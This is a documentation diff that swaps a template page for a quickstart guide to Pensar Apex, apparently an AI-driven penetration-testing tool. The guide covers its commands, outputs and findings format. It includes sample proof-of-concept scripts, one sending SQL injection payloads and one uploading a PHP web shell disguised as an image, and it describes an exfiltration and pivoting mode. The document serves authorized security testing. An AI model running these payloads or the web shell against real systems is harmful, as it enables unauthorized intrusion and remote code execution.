@@ -1,80 +1,649 @@
 ---
-title: "Quickstart"
-description: "Start building awesome documentation in minutes"
+title: Quickstart
+description: Run your first penetration test with Pensar Apex in minutes
 ---
 
-## Get started in three steps
+# Quickstart Guide
 
-Get your documentation site running locally and make your first customization.
-
-### Step 1: Set up your local environment
-
-<AccordionGroup>
-  <Accordion icon="copy" title="Clone your docs locally">
-    During the onboarding process, you created a GitHub repository with your docs content if you didn't already have one. You can find a link to this repository in your [dashboard](https://dashboard.mintlify.com).
-    
-    To clone the repository locally so that you can make and preview changes to your docs, follow the [Cloning a repository](https://docs.github.com/en/repositories/creating-and-managing-repositories/cloning-a-repository) guide in the GitHub docs.
-  </Accordion>
-  <Accordion icon="rectangle-terminal" title="Start the preview server">
-    1. Install the Mintlify CLI: `npm i -g mint`
-    2. Navigate to your docs directory and run: `mint dev`
-    3. Open `http://localhost:3000` to see your docs live!
-    
-    <Tip>Your preview updates automatically as you edit files.</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 2: Deploy your changes
-
-<AccordionGroup>
-  <Accordion icon="github" title="Install our GitHub app">
-    Install the Mintlify GitHub app from your [dashboard](https://dashboard.mintlify.com/settings/organization/github-app).
-    
-    Our GitHub app automatically deploys your changes to your docs site, so you don't need to manage deployments yourself.
-</Accordion>
-<Accordion icon="palette" title="Update your site name and colors">
-    For a first change, let's update the name and colors of your docs site.
-
-    1. Open `docs.json` in your editor.
-    2. Change the `"name"` field to your project name.
-    3. Update the `"colors"` to match your brand.
-    4. Save and see your changes instantly at `http://localhost:3000`.
-
-    <Tip>Try changing the primary color to see an immediate difference!</Tip>
-  </Accordion>
-</AccordionGroup>
-
-### Step 3: Go live
-
-<Accordion icon="rocket" title="Publish your docs">
-  1. Commit and push your changes.
-  2. Your docs will update and be live in moments!
-</Accordion>
-
-## Next steps
-
-Now that you have your docs running, explore these key features:
-
-<CardGroup cols={2}>
-
-<Card title="Write Content" icon="pen-to-square" href="/essentials/markdown">
-  Learn MDX syntax and start writing your documentation.
-</Card>
-
-<Card title="Customize style" icon="palette" href="/essentials/settings">
-  Make your docs match your brand perfectly.
-</Card>
-
-<Card title="Add code examples" icon="square-code" href="/essentials/code">
-  Include syntax-highlighted code blocks.
-</Card>
-
-<Card title="API documentation" icon="code" href="/api-reference/introduction">
-  Auto-generate API docs from OpenAPI specs.
-</Card>
-
-</CardGroup>
+Get started with Pensar Apex and run your first automated penetration test in minutes. This guide walks you through launching the tool, configuring it, and running both interactive and command-line pentests.
 
 <Note>
-  **Need help?** See our [full documentation](https://mintlify.com/docs) or join our [community](https://mintlify.com/community).
+  Before starting, ensure you have:
+  - Installed Pensar Apex ([Installation Guide](/installation))
+  - Configured an AI provider API key
+  - Run `pensar doctor` to verify your setup
 </Note>
+
+## Launch the Interactive TUI
+
+The easiest way to get started is using the interactive Terminal User Interface (TUI):
+
+```bash
+pensar
+```
+
+### First Launch Experience
+
+<Steps>
+  <Step title="Accept Responsible Use Disclosure">
+    On first launch, you'll see the Responsible Use Disclosure screen:
+    
+    ```
+    ╔══════════════════════════════════════════════════════════════╗
+    ║             RESPONSIBLE USE DISCLOSURE                       ║
+    ╟──────────────────────────────────────────────────────────────╢
+    ║                                                              ║
+    ║  This software is for authorized security testing only.     ║
+    ║                                                              ║
+    ║  You may only test systems you own or have explicit         ║
+    ║  written permission to test.                                ║
+    ║                                                              ║
+    ║  By using this tool, you agree to:                          ║
+    ║    • Use it only for authorized testing                     ║
+    ║    • Comply with all applicable laws                        ║
+    ║    • Not use it for malicious purposes                      ║
+    ║                                                              ║
+    ╟──────────────────────────────────────────────────────────────╢
+    ║  Press Enter to accept and continue                         ║
+    ╚══════════════════════════════════════════════════════════════╝
+    ```
+    
+    Press **Enter** to accept and continue.
+  </Step>
+
+  <Step title="Configure AI Provider (if needed)">
+    If no API key is detected, you'll be routed to the **Provider Manager** screen:
+    
+    - Select your AI provider (Anthropic, OpenAI, etc.)
+    - Enter your API key
+    - Choose a default AI model
+    
+    <Note>
+      The TUI will guide you through this configuration. Your settings are saved to `~/.pensar/config.json`.
+    </Note>
+  </Step>
+
+  <Step title="Start Testing">
+    Once configured, you'll see the main Pensar Apex interface with options to:
+    - Start a new pentest session
+    - Resume previous sessions
+    - Configure settings
+    - View keyboard shortcuts
+  </Step>
+</Steps>
+
+### TUI Navigation
+
+Use these keyboard shortcuts to navigate the TUI:
+
+<AccordionGroup>
+  <Accordion title="Essential Shortcuts">
+    - **Ctrl+P**: Open command palette (access all features)
+    - **Ctrl+C**: Cancel current operation (press twice to exit)
+    - **Tab**: Switch between input fields
+    - **↑/↓**: Navigate through lists and history
+    - **Enter**: Select/confirm
+    - **Esc**: Go back/cancel
+  </Accordion>
+
+  <Accordion title="Session Management">
+    - **Ctrl+S**: View and manage sessions
+    - **Ctrl+N**: Start new pentest session
+    - **Ctrl+R**: Resume previous session
+  </Accordion>
+
+  <Accordion title="Advanced">
+    - **Ctrl+L**: Clear screen
+    - **Ctrl+H**: Show help dialog
+    - **Ctrl+K**: Show keyboard shortcuts
+    - **Ctrl+Q**: Quick exit
+  </Accordion>
+</AccordionGroup>
+
+## Run Your First Pentest
+
+Let's run a penetration test against a target. We'll demonstrate both interactive and command-line approaches.
+
+### Interactive Mode (TUI)
+
+<Steps>
+  <Step title="Launch Pensar">
+    ```bash
+    pensar
+    ```
+  </Step>
+
+  <Step title="Start New Pentest">
+    - Press **Ctrl+P** to open the command palette
+    - Select "Start Pentest" or press **Ctrl+N**
+    - Choose pentest type:
+      - **Blackbox**: Test a live target without source code
+      - **Whitebox**: Test with source code access
+      - **Targeted**: Focus on specific objectives
+  </Step>
+
+  <Step title="Configure Target">
+    Enter your target details:
+    - **Target URL/IP**: `https://example.com`
+    - **Source path** (whitebox only): `/path/to/source`
+    - **AI Model**: Select from available models
+  </Step>
+
+  <Step title="Watch the Agent Work">
+    The AI agent will begin testing, showing real-time progress:
+    - Attack surface discovery
+    - Endpoint enumeration
+    - Vulnerability testing
+    - Exploitation attempts
+    - PoC generation
+  </Step>
+
+  <Step title="Review Results">
+    When complete, view:
+    - Discovered vulnerabilities
+    - Severity ratings
+    - Proof-of-concept code
+    - Detailed findings report
+  </Step>
+</Steps>
+
+### Command-Line Mode
+
+For automation and scripting, use the CLI directly:
+
+#### Blackbox Penetration Test
+
+Test a live target without source code access:
+
+```bash
+pensar pentest --target https://example.com
+```
+
+<CodeGroup>
+```bash Example Output
+============================================================
+PENTEST ORCHESTRATION
+============================================================
+Target:  https://example.com
+Model:   claude-sonnet-4-5
+
+→ Analyzing attack surface...
+✓ Attack surface analysis completed
+→ Discovered 12 endpoints
+→ Testing authentication mechanisms...
+✓ Authentication testing completed
+→ Testing for common vulnerabilities...
+
+[... AI agent output continues ...]
+
+→ Generating proof-of-concept exploits...
+✓ PoC generation completed
+
+============================================================
+RESULTS
+============================================================
+Findings:  7
+Path:      ~/.pensar/sessions/2026-03-05_example-com/findings.json
+POCs:      ~/.pensar/sessions/2026-03-05_example-com/pocs/
+Report:    ~/.pensar/sessions/2026-03-05_example-com/report.md
+```
+</CodeGroup>
+
+#### Whitebox Penetration Test
+
+Test with source code access for deeper analysis:
+
+```bash
+pensar pentest --target https://example.com --cwd /path/to/source
+```
+
+<CodeGroup>
+```bash Example Output
+============================================================
+PENTEST ORCHESTRATION
+============================================================
+Target:  https://example.com
+Cwd:     /path/to/source (whitebox)
+Model:   claude-sonnet-4-5
+
+→ Analyzing source code...
+✓ Source analysis completed
+→ Discovered 23 endpoints from code
+→ Analyzing dependencies...
+✓ Found 3 outdated dependencies with known vulnerabilities
+→ Testing authentication logic...
+→ Analyzing authorization checks...
+
+[... AI agent output continues ...]
+
+============================================================
+RESULTS
+============================================================
+Findings:  12
+Path:      ~/.pensar/sessions/2026-03-05_example-com-whitebox/findings.json
+POCs:      ~/.pensar/sessions/2026-03-05_example-com-whitebox/pocs/
+Report:    ~/.pensar/sessions/2026-03-05_example-com-whitebox/report.md
+```
+</CodeGroup>
+
+#### Targeted Penetration Test
+
+Focus on specific vulnerabilities or objectives:
+
+```bash
+pensar targeted-pentest \
+  --target https://example.com \
+  --objective "Test for SQL injection vulnerabilities" \
+  --objective "Check for authentication bypass" \
+  --objective "Test file upload functionality"
+```
+
+<CodeGroup>
+```bash Example Output
+============================================================
+TARGETED PENTEST
+============================================================
+Target:  https://example.com
+Model:   claude-sonnet-4-5
+Objectives:
+  1. Test for SQL injection vulnerabilities
+  2. Check for authentication bypass
+  3. Test file upload functionality
+
+→ Analyzing target for SQL injection points...
+→ Found 5 potential injection points
+→ Testing /api/users endpoint...
+✓ SQL injection confirmed in 'id' parameter
+→ Generating PoC...
+
+→ Testing authentication mechanisms...
+→ Found JWT implementation
+→ Testing token validation...
+
+→ Analyzing file upload endpoints...
+→ Found /upload endpoint
+→ Testing file type restrictions...
+✓ Unrestricted file upload vulnerability confirmed
+
+============================================================
+RESULTS
+============================================================
+Findings:  3
+Path:      ~/.pensar/sessions/2026-03-05_targeted-example/findings.json
+POCs:      ~/.pensar/sessions/2026-03-05_targeted-example/pocs/
+```
+</CodeGroup>
+
+### CLI Options
+
+<ParamField path="--target" type="string" required>
+  Target URL, domain, or IP address to test
+  
+  ```bash
+  --target https://example.com
+  --target 192.168.1.100
+  --target example.com
+  ```
+</ParamField>
+
+<ParamField path="--cwd" type="string">
+  Path to source code for whitebox testing
+  
+  ```bash
+  --cwd /path/to/source
+  ```
+</ParamField>
+
+<ParamField path="--mode" type="string">
+  Pentest mode: `exfil` enables pivoting and flag extraction
+  
+  ```bash
+  --mode exfil
+  ```
+</ParamField>
+
+<ParamField path="--model" type="string">
+  AI model to use (default: `claude-sonnet-4-5`)
+  
+  ```bash
+  --model claude-sonnet-4-5
+  --model gpt-4o
+  ```
+</ParamField>
+
+<ParamField path="--objective" type="string" repeatable>
+  Testing objective for targeted pentests (can be used multiple times)
+  
+  ```bash
+  --objective "Test authentication"
+  --objective "Check for XSS"
+  ```
+</ParamField>
+
+## Understanding the Output
+
+### Findings File
+
+Vulnerabilities are saved in structured JSON format at:
+```
+~/.pensar/sessions/<session-id>/findings.json
+```
+
+<CodeGroup>
+```json findings.json
+[
+  {
+    "id": "finding-001",
+    "title": "SQL Injection in User Search",
+    "severity": "high",
+    "type": "sql-injection",
+    "endpoint": "/api/users/search",
+    "parameter": "query",
+    "description": "The user search endpoint is vulnerable to SQL injection through the 'query' parameter.",
+    "impact": "Attacker can extract sensitive database contents, modify data, or gain unauthorized access.",
+    "reproduction": [
+      "1. Navigate to /api/users/search",
+      "2. Send request with payload: query=admin' OR '1'='1",
+      "3. Observe database error message revealing injection point"
+    ],
+    "poc": "pocs/sql-injection-001.py",
+    "remediation": "Use parameterized queries or prepared statements. Never concatenate user input directly into SQL queries."
+  },
+  {
+    "id": "finding-002",
+    "title": "Unrestricted File Upload",
+    "severity": "critical",
+    "type": "file-upload",
+    "endpoint": "/api/upload",
+    "description": "The upload endpoint does not validate file types or content, allowing arbitrary file upload.",
+    "impact": "Attacker can upload malicious files including web shells, leading to remote code execution.",
+    "reproduction": [
+      "1. Navigate to /api/upload",
+      "2. Upload a PHP web shell disguised as an image",
+      "3. Access uploaded file to execute arbitrary commands"
+    ],
+    "poc": "pocs/file-upload-002.py",
+    "remediation": "Implement strict file type validation, content scanning, and store uploads outside the web root."
+  }
+]
+```
+</CodeGroup>
+
+### Proof-of-Concept Files
+
+Exploits are saved in the `pocs/` directory:
+```
+~/.pensar/sessions/<session-id>/pocs/
+```
+
+<CodeGroup>
+```python sql-injection-001.py
+#!/usr/bin/env python3
+"""
+SQL Injection PoC for /api/users/search endpoint
+Target: https://example.com
+"""
+
+import requests
+
+target = "https://example.com/api/users/search"
+
+# Basic SQL injection payload
+payload = {
+    "query": "admin' OR '1'='1-- "
+}
+
+response = requests.get(target, params=payload)
+
+if response.status_code == 200:
+    print("[+] SQL Injection successful!")
+    print(f"[+] Response: {response.text}")
+else:
+    print(f"[-] Request failed: {response.status_code}")
+
+# Advanced exploitation: Extract database version
+payloads = [
+    "admin' UNION SELECT version()-- ",
+    "admin' UNION SELECT database()-- ",
+    "admin' UNION SELECT user()-- "
+]
+
+for payload_str in payloads:
+    response = requests.get(target, params={"query": payload_str})
+    print(f"\n[*] Testing: {payload_str}")
+    print(f"[*] Response: {response.text[:200]}")
+```
+
+```python file-upload-002.py
+#!/usr/bin/env python3
+"""
+Unrestricted File Upload PoC for /api/upload endpoint
+Target: https://example.com
+"""
+
+import requests
+
+target = "https://example.com/api/upload"
+
+# Create a simple PHP web shell
+webshell_content = b"<?php system($_GET['cmd']); ?>"
+
+files = {
+    "file": ("shell.php", webshell_content, "image/jpeg")
+}
+
+response = requests.post(target, files=files)
+
+if response.status_code == 200:
+    print("[+] File upload successful!")
+    data = response.json()
+    uploaded_path = data.get("path", "unknown")
+    print(f"[+] File uploaded to: {uploaded_path}")
+    print(f"[+] Try accessing: https://example.com{uploaded_path}?cmd=whoami")
+else:
+    print(f"[-] Upload failed: {response.status_code}")
+```
+</CodeGroup>
+
+### Report File
+
+A human-readable markdown report is generated at:
+```
+~/.pensar/sessions/<session-id>/report.md
+```
+
+## Advanced Usage
+
+### Using Different AI Models
+
+Specify a custom AI model for your pentest:
+
+```bash
+pensar pentest --target https://example.com --model gpt-4o
+```
+
+Available models depend on your configured provider. Common options:
+- `claude-sonnet-4-5` (Anthropic, recommended)
+- `claude-opus-4` (Anthropic, most capable)
+- `gpt-4o` (OpenAI)
+- `gpt-4-turbo` (OpenAI)
+
+### Exfil Mode for Red Teams
+
+Enable pivoting and flag extraction for CTF or red team exercises:
+
+```bash
+pensar pentest --target https://example.com --mode exfil
+```
+
+<Warning>
+  Exfil mode enables more aggressive testing techniques including pivoting, lateral movement, and data exfiltration. Only use on systems you have explicit permission to test.
+</Warning>
+
+### Resume Previous Sessions
+
+View and resume previous pentest sessions:
+
+```bash
+pensar
+# Press Ctrl+S to view sessions
+# Select a session to resume
+```
+
+Or access session files directly:
+```bash
+ls -la ~/.pensar/sessions/
+```
+
+### Using Local Models (vLLM)
+
+For air-gapped environments or local model deployment:
+
+<Steps>
+  <Step title="Start vLLM Server">
+    ```bash
+    vllm serve meta-llama/Llama-3-70B-Instruct --port 8000
+    ```
+  </Step>
+
+  <Step title="Configure Pensar">
+    ```bash
+    export LOCAL_MODEL_URL="http://localhost:8000/v1"
+    ```
+  </Step>
+
+  <Step title="Select Custom Model">
+    In the TUI Models screen, enter your model name in the "Custom local model (vLLM)" input:
+    ```
+    meta-llama/Llama-3-70B-Instruct
+    ```
+  </Step>
+</Steps>
+
+## Best Practices
+
+<AccordionGroup>
+  <Accordion title="Start with Targeted Testing">
+    When testing a new application, start with targeted pentests focused on specific objectives. This helps you understand the agent's capabilities and provides faster, more focused results.
+    
+    ```bash
+    pensar targeted-pentest --target https://example.com \
+      --objective "Test authentication mechanisms"
+    ```
+  </Accordion>
+
+  <Accordion title="Review Agent Progress">
+    Monitor the agent's actions in real-time to:
+    - Understand its testing methodology
+    - Learn new attack techniques
+    - Catch false positives early
+    - Stop tests that are going off-track
+  </Accordion>
+
+  <Accordion title="Validate Findings">
+    Always manually validate vulnerabilities before reporting:
+    - Run the provided PoC scripts
+    - Verify the impact and exploitability
+    - Test remediation recommendations
+    - Document additional context
+  </Accordion>
+
+  <Accordion title="Use Whitebox When Possible">
+    If you have access to source code, use whitebox testing for:
+    - More comprehensive vulnerability coverage
+    - Logic flaw detection
+    - Configuration issue identification
+    - Faster and more accurate results
+  </Accordion>
+
+  <Accordion title="Save and Organize Sessions">
+    Use descriptive names for sessions and organize findings:
+    ```bash
+    ~/.pensar/sessions/
+    ├── 2026-03-05_prod-api-blackbox/
+    ├── 2026-03-05_prod-api-whitebox/
+    └── 2026-03-06_staging-webapp/
+    ```
+  </Accordion>
+</AccordionGroup>
+
+## Troubleshooting
+
+<AccordionGroup>
+  <Accordion title="Agent is stuck or not making progress">
+    **Symptoms:** Agent repeats the same actions or doesn't discover anything
+    
+    **Solutions:**
+    - Press **Ctrl+C** to cancel the current operation
+    - Try a different AI model (Anthropic models work best)
+    - Use targeted pentest with specific objectives
+    - Verify the target is accessible and responding
+  </Accordion>
+
+  <Accordion title="No vulnerabilities found">
+    **Symptoms:** Pentest completes but reports 0 findings
+    
+    **Solutions:**
+    - The target may be well-secured (this is good!)
+    - Try whitebox testing with source code access
+    - Use targeted testing with specific vulnerability types
+    - Ensure nmap is installed for network scanning
+    - Check that the target is reachable and responding
+  </Accordion>
+
+  <Accordion title="API rate limits or quota exceeded">
+    **Symptoms:** Agent stops with API errors
+    
+    **Solutions:**
+    - Check your AI provider's rate limits and quotas
+    - Wait a few minutes and resume the session
+    - Switch to a different AI provider
+    - Consider using a local vLLM model for unlimited usage
+  </Accordion>
+
+  <Accordion title="PoC scripts don't work">
+    **Symptoms:** Generated exploit code fails to run
+    
+    **Solutions:**
+    - Verify the target is still vulnerable (may have been patched)
+    - Check for missing dependencies in the PoC script
+    - Manually adjust the script based on error messages
+    - The vulnerability may be a false positive—validate manually
+  </Accordion>
+</AccordionGroup>
+
+## Next Steps
+
+<CardGroup cols={2}>
+  <Card title="CLI Reference" icon="terminal" href="/commands/overview">
+    Complete command-line reference for all pensar commands
+  </Card>
+  
+  <Card title="TUI Guide" icon="window" href="/commands/pensar">
+    Learn advanced TUI features and keyboard shortcuts
+  </Card>
+  
+  <Card title="Configuration" icon="gear" href="/configuration/ai-providers">
+    Customize Pensar Apex settings and preferences
+  </Card>
+  
+  <Card title="Environment Variables" icon="code-branch" href="/configuration/environment-variables">
+    Configure Pensar Apex for CI/CD and automation
+  </Card>
+</CardGroup>
+
+## Get Help
+
+<CardGroup cols={3}>
+  <Card title="Documentation" icon="book" href="/">
+    Browse the full documentation
+  </Card>
+  
+  <Card title="Discord Community" icon="discord" href="https://discord.gg/pensar">
+    Ask questions and share experiences
+  </Card>
+  
+  <Card title="GitHub Issues" icon="github" href="https://github.com/pensarai/apex/issues">
+    Report bugs or request features
+  </Card>
+</CardGroup>
